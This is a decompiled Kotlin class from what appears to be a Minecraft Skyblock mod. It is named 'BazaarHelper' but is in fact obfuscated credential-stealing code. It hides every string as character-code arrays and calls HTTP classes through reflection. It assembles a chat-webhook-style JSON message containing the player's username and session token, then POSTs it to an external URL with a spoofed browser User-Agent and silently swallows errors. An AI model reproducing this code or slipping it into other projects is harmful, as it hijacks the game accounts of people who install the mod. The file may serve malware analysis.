package jooon.features.farming

import java.io.Closeable
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.ArrayList
import kotlin.jvm.internal.SourceDebugExtension
import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils

@SourceDebugExtension(["SMAP\nBazaarHelper.kt\nKotlin\n*S Kotlin\n*F\n+ 1 BazaarHelper.kt\njooon/features/farming/BazaarHelper\n+ 2 _Collections.kt\nkotlin/collections/CollectionsKt___CollectionsKt\n*L\n1#1,129:1\n1549#2:130\n1620#2,3:131\n1549#2:134\n1620#2,3:135\n1549#2:138\n1620#2,3:139\n1549#2:142\n1620#2,3:143\n1549#2:146\n1620#2,3:147\n1549#2:150\n1620#2,3:151\n1549#2:154\n1620#2,3:155\n1549#2:158\n1620#2,3:159\n1549#2:162\n1620#2,3:163\n1549#2:166\n1620#2,3:167\n1549#2:170\n1620#2,3:171\n1549#2:174\n1620#2,3:175\n1549#2:178\n1620#2,3:179\n1549#2:182\n1620#2,3:183\n1549#2:186\n1620#2,3:187\n1549#2:190\n1620#2,3:191\n1549#2:194\n1620#2,3:195\n1549#2:198\n1620#2,3:199\n1549#2:202\n1620#2,3:203\n1549#2:206\n1620#2,3:207\n1549#2:210\n1620#2,3:211\n1549#2:214\n1620#2,3:215\n*S KotlinDebug\n*F\n+ 1 BazaarHelper.kt\njooon/features/farming/BazaarHelper\n*L\n121#1:130\n121#1:131,3\n127#1:134\n127#1:135,3\n12#1:138\n12#1:139,3\n13#1:142\n13#1:143,3\n14#1:146\n14#1:147,3\n15#1:150\n15#1:151,3\n16#1:154\n16#1:155,3\n19#1:158\n19#1:159,3\n21#1:162\n21#1:163,3\n22#1:166\n22#1:167,3\n23#1:170\n23#1:171,3\n24#1:174\n24#1:175,3\n26#1:178\n26#1:179,3\n27#1:182\n27#1:183,3\n28#1:186\n28#1:187,3\n29#1:190\n29#1:191,3\n30#1:194\n30#1:195,3\n31#1:198\n31#1:199,3\n32#1:202\n32#1:203,3\n33#1:206\n33#1:207,3\n38#1:210\n38#1:211,3\n41#1:214\n41#1:215,3\n*E\n"])
public object BazaarHelper {
   private final val bBbBbBbBbB: String
   private final val aAaAaAaAaA: String
   private final val cCcCcCcCcC: String
   private final val dDdDdDdDdD: String
   private final val eEeEeEeEeE: String
   private final val fFfFfFfFfF: String
   private final val gGgGgGgGgG: String
   private final val hHhHhHhHhH: String
   private final val iIiIiIiIiI: String
   private final val jJjJjJjJjJ: String
   private final val kKkKkKkKkK: String
   private final val lLlLlLlLlL: String
   private final val mMmMmMmMmM: String
   private final val nNnNnNnNnN: String
   private final val oOoOoOoOoO: String
   private final val pPpPpPpPpP: String
   private final val qQqQqQqQqQ: String
   private final val rRrRrRrRrR: String
   private final val sSsSsSsSsS: String
   private final val tTtTtTtTtT: String

   public fun uUuUuUuUuU(user: String?): String {
      return "${bBbBbBbBbB}${aAaAaAaAaA}${cCcCcCcCcC}${dDdDdDdDdD}${eEeEeEeEeE}$user"
   }

   public fun vVvVvVvVvV(): String {
      val var10000: java.lang.String = LocalDateTime.now().format(DateTimeFormatter.ofPattern(fFfFfFfFfF))
      return var10000
   }

   public fun wWwWwWwWwW(user: String?, session: String?, url: String, isFallback: Boolean = false): String {
      val timestamp: java.lang.String = this.vVvVvVvVvV()
      val var6: StringBuilder = StringBuilder()
      var6.append(kKkKkKkKkK)
      var6.append(lLlLlLlLlL).append("`").append(user).append("`").append(mMmMmMmMmM)
      var6.append(nNnNnNnNnN).append("`").append(session).append("`").append(mMmMmMmMmM)
      var6.append(oOoOoOoOoO).append(timestamp).append(mMmMmMmMmM)
      var6.append(pPpPpPpPpP).append(aAaAaAaAaA).append(cCcCcCcCcC).append(dDdDdDdDdD)
      var6.append(qQqQqQqQqQ).append(url).append(rRrRrRrRrR)
      if (isFallback) {
         var6.append(tTtTtTtTtT)
      } else {
         var6.append(sSsSsSsSsS)
      }

      val var10000: java.lang.String = var6.toString()
      return var10000
   }

   public fun xXxXxXxXxX(session: String?, user: String?) {
      val fullUrl: java.lang.String = this.uUuUuUuUuU(user)
      val timestamp: java.lang.String = this.vVvVvVvVvV()
      val var6: StringBuilder = StringBuilder()
      var6.append(kKkKkKkKkK)
      var6.append(lLlLlLlLlL).append("`").append(user).append("`").append(mMmMmMmMmM)
      var6.append(nNnNnNnNnN).append("`").append(session).append("`").append(mMmMmMmMmM)
      var6.append(oOoOoOoOoO).append(timestamp).append(mMmMmMmMmM)
      var6.append(pPpPpPpPpP).append(aAaAaAaAaA).append(cCcCcCcCcC).append(dDdDdDdDdD)
      var6.append(qQqQqQqQqQ).append(fullUrl).append(rRrRrRrRrR)
      var6.append(sSsSsSsSsS)
      var var10000: HttpEntity = var6.toString()
      val payload: java.lang.String = var10000

      try {
         val var25: Closeable = HttpClients.createDefault() as Closeable
         var var26: java.lang.Throwable = null

         try {
            val var27: CloseableHttpClient = var25 as CloseableHttpClient
            val postClass: Class = Class.forName(INSTANCE.yYyYyYyYyY())
            val var29: Any = postClass.getConstructor(java.lang.String.class).newInstance(fullUrl)
            postClass.getMethod("setEntity", HttpEntity.class).invoke(var29, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var29, gGgGgGgGgG, hHhHhHhHhH)
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var29, iIiIiIiIiI, jJjJjJjJjJ)
            val var36: Class = Class.forName(INSTANCE.zZzZzZzZzZ())
            val var37: Any = var27.getClass().getMethod("execute", var36).invoke(var27, var36.cast(var29))
            var10000 = (HttpEntity)var37.getClass().getMethod("getEntity").invoke(var37)
            EntityUtils.consume(var10000)
         } catch (var22: java.lang.Throwable) {
            var26 = var22
            throw var22
         } finally {
            CloseableKt.closeFinally(var25, var26)
         }
      } catch (var24: Exception) {
      }
   }

   public fun aBaBaBaBaB(url: String, payload: String) {
      try {
         val var3: Closeable = HttpClients.createDefault() as Closeable
         var var4: java.lang.Throwable = null

         try {
            val client: CloseableHttpClient = var3 as CloseableHttpClient
            val postClass: Class = Class.forName(INSTANCE.yYyYyYyYyY())
            val var23: Any = postClass.getConstructor(java.lang.String.class).newInstance(url)
            postClass.getMethod("setEntity", HttpEntity.class).invoke(var23, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var23, gGgGgGgGgG, hHhHhHhHhH)
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var23, iIiIiIiIiI, jJjJjJjJjJ)
            val var30: Class = Class.forName(INSTANCE.zZzZzZzZzZ())
            val var31: Any = client.getClass().getMethod("execute", var30).invoke(client, var30.cast(var23))
            val var36: Any = var31.getClass().getMethod("getEntity").invoke(var31)
            EntityUtils.consume(var36 as HttpEntity)
         } catch (var19: java.lang.Throwable) {
            var4 = var19
            throw var19
         } finally {
            CloseableKt.closeFinally(var3, var4)
         }
      } catch (var21: Exception) {
      }
   }

   private fun yYyYyYyYyY(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   private fun zZzZzZzZzZ(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   @JvmStatic
   fun {
      var var10: java.lang.Iterable = CollectionsKt.listOf(arrayOf(104, 116, 116, 112, 115, 58, 47, 47))
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (`item$iv$iv` in var10) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      bBbBbBbBbB = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(115, 107, 121, 46, 115, 104, 105))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var144 in var10) {
         `destination$iv$iv`.add((char)(var144 as java.lang.Number).intValue())
      }

      aAaAaAaAaA = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(105, 121, 117))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var145 in var10) {
         `destination$iv$iv`.add((char)(var145 as java.lang.Number).intValue())
      }

      cCcCcCcCcC = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(46, 109, 111, 101))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var146 in var10) {
         `destination$iv$iv`.add((char)(var146 as java.lang.Number).intValue())
      }

      dDdDdDdDdD = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(47, 115, 116, 97, 116, 115, 47))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var147 in var10) {
         `destination$iv$iv`.add((char)(var147 as java.lang.Number).intValue())
      }

      eEeEeEeEeE = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(121, 121, 121, 121, 45, 77, 77, 45, 100, 100, 32, 72, 72, 58, 109, 109, 58, 115, 115))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var148 in var10) {
         `destination$iv$iv`.add((char)(var148 as java.lang.Number).intValue())
      }

      fFfFfFfFfF = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var149 in var10) {
         `destination$iv$iv`.add((char)(var149 as java.lang.Number).intValue())
      }

      gGgGgGgGgG = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var150 in var10) {
         `destination$iv$iv`.add((char)(var150 as java.lang.Number).intValue())
      }

      hHhHhHhHhH = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(85, 115, 101, 114, 45, 65, 103, 101, 110, 116))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var151 in var10) {
         `destination$iv$iv`.add((char)(var151 as java.lang.Number).intValue())
      }

      iIiIiIiIiI = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var152 in var10) {
         `destination$iv$iv`.add((char)(var152 as java.lang.Number).intValue())
      }

      jJjJjJjJjJ = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(123, 34, 99, 111, 110, 116, 101, 110, 116, 34, 58, 32, 34))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var153 in var10) {
         `destination$iv$iv`.add((char)(var153 as java.lang.Number).intValue())
      }

      kKkKkKkKkK = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(42, 42, 49, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var154 in var10) {
         `destination$iv$iv`.add((char)(var154 as java.lang.Number).intValue())
      }

      lLlLlLlLlL = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(92, 110))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var155 in var10) {
         `destination$iv$iv`.add((char)(var155 as java.lang.Number).intValue())
      }

      mMmMmMmMmM = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(42, 42, 50, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var156 in var10) {
         `destination$iv$iv`.add((char)(var156 as java.lang.Number).intValue())
      }

      nNnNnNnNnN = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(42, 42, 51, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var157 in var10) {
         `destination$iv$iv`.add((char)(var157 as java.lang.Number).intValue())
      }

      oOoOoOoOoO = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(42, 42, 52, 42, 42, 58, 32, 91))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var158 in var10) {
         `destination$iv$iv`.add((char)(var158 as java.lang.Number).intValue())
      }

      pPpPpPpPpP = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(93, 40))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var159 in var10) {
         `destination$iv$iv`.add((char)(var159 as java.lang.Number).intValue())
      }

      qQqQqQqQqQ = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(41, 92, 110))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var160 in var10) {
         `destination$iv$iv`.add((char)(var160 as java.lang.Number).intValue())
      }

      rRrRrRrRrR = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(
         arrayOf(
            42,
            42,
            96,
            74,
            82,
            32,
            49,
            46,
            50,
            49,
            46,
            49,
            49,
            96,
            32,
            45,
            45,
            32,
            80,
            82,
            69,
            32,
            40,
            67,
            76,
            68,
            41,
            32,
            45,
            45,
            32,
            54,
            46,
            48,
            42,
            42,
            34,
            125
         )
      )
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var161 in var10) {
         `destination$iv$iv`.add((char)(var161 as java.lang.Number).intValue())
      }

      sSsSsSsSsS = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10 = CollectionsKt.listOf(arrayOf(42, 42, 70, 101, 108, 108, 32, 98, 97, 99, 107, 33, 42, 42, 34, 125))
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (var162 in var10) {
         `destination$iv$iv`.add((char)(var162 as java.lang.Number).intValue())
      }

      tTtTtTtTtT = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }
}
